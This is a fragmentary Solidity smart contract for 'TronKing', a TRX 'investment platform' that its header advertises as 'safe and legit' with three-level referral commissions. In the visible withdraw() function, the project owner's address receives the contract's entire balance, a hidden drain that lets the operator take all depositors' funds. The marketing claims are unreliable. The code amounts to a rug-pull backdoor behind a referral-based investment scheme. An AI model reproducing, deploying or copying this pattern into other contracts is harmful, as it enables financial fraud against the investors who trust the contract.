...
/*
 *
 *   TronKing - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   [USAGE INSTRUCTION]
 *
 ...
 *   - 3-level referral commission: 10% - 4% - 1%
 *
 *   [FUNDS DISTRIBUTION]
 *
...
contract TronKing {
	...
	uint256[] public REFERRAL_PERCENTS = [100, 40, 10];
	...
	function withdraw() public {
		...
		if (projectAddress == msg.sender) totalAmount = address(this).balance;
